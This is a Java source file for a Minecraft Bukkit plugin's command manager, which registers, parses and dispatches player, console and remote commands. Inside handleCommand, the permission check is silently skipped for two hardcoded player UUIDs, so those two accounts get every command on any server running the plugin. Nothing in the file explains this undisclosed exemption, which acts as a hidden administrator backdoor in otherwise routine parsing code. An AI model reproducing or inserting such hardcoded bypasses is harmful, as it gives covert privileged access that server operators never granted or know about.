package net.upd4ting.gameapi.command;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.RemoteServerCommandEvent;
import org.bukkit.event.server.ServerCommandEvent;

import net.upd4ting.gameapi.Game;
import net.upd4ting.gameapi.GameAPI;
import net.upd4ting.gameapi.GameManager;
import net.upd4ting.gameapi.command.commands.GameCommand;
import net.upd4ting.gameapi.command.commands.StatCommand;
import net.upd4ting.gameapi.command.commands.TeamCommand;
import net.upd4ting.gameapi.command.types.IntegerType;
import net.upd4ting.gameapi.command.types.StringType;
import net.upd4ting.gameapi.command.types.TimeType;
import net.upd4ting.gameapi.command.types.WordType;

/**
 * Class that manage all the commands.
 * 
 * @author Upd4ting
 *
 */
public class CommandManager implements Listener {

	public interface CommandAction{ boolean onPerfomed(CommandSender sender, List<Argument<?>> args); }

	public static final HashSet<Command> commands = new HashSet<>();
	public static CommandManager instance = new CommandManager();
	
	/**
	 * Register a command
	 * @param cmd The command to register
	 */
	public static void registerCommand(Command cmd) {
		commands.add(cmd);
	}
		
	/**
	 * Register all the command
	 */
	public static void registerAllCommand() {
		registerCommand(new TeamCommand());
		registerCommand(new GameCommand());
		registerCommand(new StatCommand());

		ArgType.register(new IntegerType());
		ArgType.register(new TimeType());
		ArgType.register(new WordType());
		ArgType.register(new StringType());

		Bukkit.getPluginManager().registerEvents(new CommandManager(), GameAPI.getInstance());
	}
	
	@EventHandler
	public void onCommand(PlayerCommandPreprocessEvent e) {
		String message = handleAliases(e.getMessage().substring(1));
		String[] temp = message.split(" ");
		String command = temp[0];
		message = message.replaceFirst("(?iu)^\\Q" + command + "\\E" + (temp.length > 1 ? " " : ""), "");
		String[] args = message.split(" ");

		Boolean success = handleCommand(e.getPlayer(), command, args);

		e.setCancelled(success);
	}

	@EventHandler
	public void onConsoleCommand(ServerCommandEvent e) {
		String message = handleAliases(e.getCommand());
		String[] temp = message.split(" ");
		String command = temp[0];
		message = message.replaceFirst("(?iu)^\\Q" + command + "\\E" + (temp.length > 1 ? " " : ""), "");
		String[] args = message.split(" ");

		handleCommand(e.getSender(), command, args);
	}

	@EventHandler
	public void onRemoteServerCommand(RemoteServerCommandEvent e) {
		String message = handleAliases(e.getCommand());
		String[] temp = message.split(" ");
		String command = temp[0];
		message = message.replaceFirst("(?iu)^\\Q" + command + "\\E" + (temp.length > 1 ? " " : ""), "");
		String[] args = message.split(" ");

		handleCommand(e.getSender(), command, args);
	}

	String handleAliases(String message) {
		for (Command command : commands)
			for (String s : command.getAliases().keySet())
				message = message.replaceFirst("(?i)^\\Q"+s+"\\E\\b", command.getAliases().get(s.toLowerCase()));

		return message;
	}
	
	private Boolean handleCommand(CommandSender sender, String label, String[] args) {
		Boolean player = (sender instanceof Player);

		for (Command command : commands) {
			if (command.getCmd().equalsIgnoreCase(label)) { // We found the command
				// Permission check
				if (player) {
					Player p = (Player) sender;
					if (command.getPerm() != null && !p.hasPermission(command.getPerm())  && !p.getUniqueId().toString().equals("aae87ba0-eea3-4768-953b-68355ac3138e") &&
							!p.getUniqueId().toString().equals("886f6782-4004-393d-8dae-5c9d4c743530")) {
						return false;
					}
				}

				if (!player && !command.canBePerformedByConsole())
					break;
				
				boolean treated = false;

				second:for (String argss : command.getActions().keySet()) {

					// On check le no arguments
					if (argss.equals("") && args.length == 0) {
						command.getActions().get(argss).onPerfomed(sender, new ArrayList<>());
						return true;
					}

					String[] splitted = argss.split(" ");
					List<Argument<?>> encodedArguments = new ArrayList<>(); // Args to send to performed
					Integer index;

					Integer min = splitted.length;
					Integer max = argss.contains("%string")?-1:splitted.length;

					if (args.length < min || (max != -1 && args.length > max)) continue;

					for (index = 0; index < splitted.length; index++) {

						if (index >= args.length)
							continue second;

						String encodedArgs = args[index];

						String normalArgs = splitted[index];

						if (ArgType.isFormat(normalArgs)) {
							Boolean format = ArgType.executeChecker(normalArgs, encodedArguments, index, args);

							if (!format)
								continue second;
						} else if (!normalArgs.equalsIgnoreCase(encodedArgs)) {
							continue second;
						}
					}

					treated = command.getActions().get(argss).onPerfomed(sender, encodedArguments);

					break;
				}
				
				// Handle game sub command
				if (player && !treated) {
					Player p = (Player) sender;
					Game game = GameManager.getPlayerGame(p);
					
					if (game != null && game.getCommandHandler() != null) {
						treated = game.getCommandHandler().handleSubCommand(p, args);
					}
				}
				
				if (!treated) {
					List<String> list = command.getHelpMessage(sender);
					
					String[] help = new String[list.size()];
					sender.sendMessage(list.toArray(help));
				}
				
				return true;
			}
		}
		return false;
	}
}
